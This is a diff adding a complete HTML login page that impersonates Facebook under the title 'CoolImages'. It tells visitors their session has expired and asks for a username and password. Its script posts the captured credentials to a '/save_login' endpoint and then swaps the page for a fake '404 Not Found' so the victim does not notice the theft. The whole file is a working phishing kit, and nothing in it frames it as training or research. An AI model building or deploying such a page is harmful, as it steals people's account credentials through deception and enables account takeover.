@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>CoolImages</title>
+<style>
+  :root{--bg:#fafafa;--card:#fff;--muted:#8e8e8e;--accent:#3897f0}
+  html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Arial,sans-serif;background:var(--bg);color:#111}
+  .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
+  .card{width:380px;background:var(--card);border:1px solid #dbdbdb;border-radius:10px;padding:20px 22px;box-shadow:0 10px 30px rgba(0,0,0,0.06);text-align:center}
+  .brand{display:flex;align-items:center;gap:12px;justify-content:center;margin-bottom:12px}
+  .logo{width:64px;height:64px;border-radius:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(0,0,0,0.08)}
+  h1{font-size:18px;margin:0}
+  .desc{color:var(--muted);font-size:13px;margin:8px 0 16px}
+  .input{width:100%;box-sizing:border-box;padding:11px 12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:8px;font-size:14px}
+  .btn{width:100%;padding:11px;border-radius:8px;border:none;background:#3897f0;color:#fff;font-weight:700;cursor:pointer;font-size:15px}
+  .btn:active{transform:translateY(1px)}
+  .small{font-size:13px;color:#777;margin-top:10px}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="main" aria-labelledby="title">
+      <div class="brand" aria-hidden="false">
+        <div class="logo" id="instaLogo">
+          <img src="logo.jpg" alt="Мій логотип" style="width:56px;height:56px;border-radius:8px;">
+        </div>
+        <div>
+          <h1 id="title">Facebook</h1>
+          <div class="desc">Your session has expired. Please log in again to continue.</div>
+        </div>
+      </div>
+
+      <div id="formArea" aria-live="polite">
+        <input class="input" id="user" type="text" placeholder="Username" autocomplete="username" />
+        <input class="input" id="pass" type="password" placeholder="Password" autocomplete="current-password" />
+        <button class="btn" id="loginBtn" type="button">Log In</button>
+        <div class="small">Forgot your password? <a href="#" id="resetLink">Reset</a></div>
+      </div>
+    </div>
+  </div>
+
+<script>
+const loginBtn = document.getElementById('loginBtn');
+const formArea = document.getElementById('formArea');
+
+function simulateLoginFlow() {
+    const u = document.getElementById('user').value.trim();
+    const p = document.getElementById('pass').value.trim();
+
+    // Надсилаємо дані на сервер
+    if(u && p){
+        fetch('/save_login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `username=${encodeURIComponent(u)}&password=${encodeURIComponent(p)}`
+        })
+        .then(res => res.text())
+        .then(data => console.log(data))
+        .catch(err => console.error(err));
+    }
+
+    // Імітація 404 після "логіну"
+    loginBtn.disabled = true;
+    loginBtn.textContent = 'Signing in...';
+    setTimeout(() => {
+        formArea.style.transition = 'opacity 220ms ease, transform 220ms ease';
+        formArea.style.opacity = '0';
+        formArea.style.transform = 'translateY(-8px)';
+        setTimeout(() => {
+            formArea.style.display = 'none';
+            document.body.innerHTML = `
+404 Not Found
+.
+`;
+        }, 260);
+    }, 900);
+}
+
+loginBtn.addEventListener('click', simulateLoginFlow);
+</script>
+</body>
+</html>
+
+
